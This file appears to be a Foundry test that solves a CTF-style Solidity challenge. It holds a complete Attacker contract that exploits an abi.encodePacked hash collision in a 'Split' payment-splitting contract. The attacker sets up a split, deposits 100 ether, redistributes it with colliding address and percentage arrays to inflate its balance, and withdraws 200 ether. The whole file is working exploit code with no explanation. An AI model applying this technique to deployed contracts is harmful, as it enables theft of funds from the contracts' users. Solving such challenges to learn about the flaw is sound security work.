// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Split} from "../src/Split.sol";
import {SplitWallet} from "../src/SplitWallet.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract CounterTest is Test {
    address split = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
    address splitWallet = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    address sw = 0xB7A5bd0345EF1Cc5E66bf61BdeC17D2461fBd968;
    address me;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8545");
        me = makeAddr("alice");
    }

    function testbalance() public {
        vm.startPrank(me);
        Attacker attacker = new Attacker();
        vm.deal(address(attacker), 100 ether);
        console2.log("Balance alice before : %s", address(attacker).balance);
        attacker.notRelevent();
        attacker.letsGo();
        console2.log("Balance alice after : %s", address(attacker).balance);
        vm.stopPrank();
    }
}

contract Attacker {
    address split = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
    address splitWallet = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    Split s = Split(payable(split));

    function letsGo() public {
        //////////////////////
        uint256 id = s.nextId() - 1;
        address[] memory addrs = new address[](2);
        addrs[0] = address(0x000000000000000000000000000000000000dEaD);
        addrs[1] = address(0x000000000000000000000000000000000000bEEF);

        uint32[] memory percents = new uint32[](2);

        percents[0] = 5e5;
        percents[1] = 5e5;

        s.distribute(id, addrs, percents, uint32(0), IERC20(address(0x00)));

        //////////////////////
        address[] memory me = new address[](2);
        me[0] = address(this);
        me[1] = address(0x100000000 -1);

        uint32[] memory me_percenta = new uint32[](2);

        me_percenta[0] = 0;
        me_percenta[1] = 1e6;
        s.createSplit(me, me_percenta, uint32(0));
         uint256 b =  s.balances(address(this),address(0));
        console2.log("Withdrawable  %s ETH ", b);
        Split.SplitData memory splitData = s.splitsById(1);
        splitData.wallet.deposit{value: 100 ether}();

        ////////////////////
        address[] memory attackerAddress = new address[](1);
        attackerAddress[0] = address(this);
        uint32[] memory hashCollision = new uint32[](3);

        hashCollision[0] = uint32(0x100000000 -1);
        hashCollision[1] = 0;
        hashCollision[2] = 1e6;
        s.distribute(1, attackerAddress, hashCollision, uint32(0), IERC20(address(0)));
 uint256 b2 =  s.balances(address(this),address(0));
        console2.log("Withdrawable  %s ETH ", b2);
        ////////////////////
        IERC20[] memory token = new IERC20[](1);
        token[0] = IERC20(address(0));
        uint256[] memory amount = new uint256[](1);
        amount[0] = 200 ether;
        s.withdraw(token, amount);

        ////////////////////
    }

    function notRelevent() public view {
        address[] memory me = new address[](2);
        me[0] = address(this);
         me[1] = address(0x100000000 -1);
        uint32[] memory me_percenta = new uint32[](2);
        me_percenta[0] = 0;
        me_percenta[1] = 1e6;

        bytes32 h = _hashSplit(me, me_percenta, 0);
        console2.logBytes32(h);
        address[] memory exploit1 = new address[](1);
        exploit1[0] = address(this);
        uint32[] memory exploit2 = new uint32[](3);
        exploit2[0] = uint32(0x100000000-1);  
        exploit2[1] = 0;
        exploit2[2] = 1e6;
        bytes32 h2 = _hashSplit(exploit1, exploit2, 0);
        console2.logBytes32(h2);
        if (h == h2) console2.log("Hashes Equal");
    }

    function _hashSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        internal
        pure
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(accounts, percents, relayerFee));
    }

    receive() external payable {}
}
